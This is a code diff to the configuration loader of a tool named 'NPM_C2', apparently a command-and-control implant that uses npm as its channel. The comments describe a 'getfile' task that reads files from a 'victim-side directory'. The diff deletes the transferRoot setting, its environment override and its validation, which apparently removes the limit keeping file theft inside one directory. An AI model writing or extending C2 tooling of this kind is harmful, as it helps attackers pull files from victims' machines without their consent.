@@ -16,7 +16,6 @@ export const DEFAULTS = {
   logFile: '', // '' disables file logging
   stateFile: '', // role-specific default is used when empty
   maxFileBytes: 32 * 1024, // cap for the getfile task (channel moves ~130B/tag)
-  transferRoot: 'transfer', // victim-side directory getfile may read from
   token: '', // only ever populated from the NPM_C2_TOKEN env var
 };
 
@@ -106,7 +105,6 @@ export function loadConfig(explicitPath) {
     const n = Number(process.env.NPM_C2_MAX_FILE_BYTES);
     if (Number.isFinite(n) && n > 0) cfg.maxFileBytes = Math.floor(n);
   }
-  if (process.env.NPM_C2_TRANSFER_ROOT) cfg.transferRoot = process.env.NPM_C2_TRANSFER_ROOT;
 
   // The auth token is ONLY ever read from the environment — never from a file.
   cfg.token = process.env.NPM_C2_TOKEN || '';
@@ -133,9 +131,6 @@ export function loadConfig(explicitPath) {
     throw new Error(`maxFileBytes must be a positive number, got ${cfg.maxFileBytes}`);
   }
   cfg.maxFileBytes = Math.floor(Number(cfg.maxFileBytes));
-  if (!cfg.transferRoot || typeof cfg.transferRoot !== 'string') {
-    throw new Error('transferRoot must be a non-empty string');
-  }
 
   return cfg;
 }
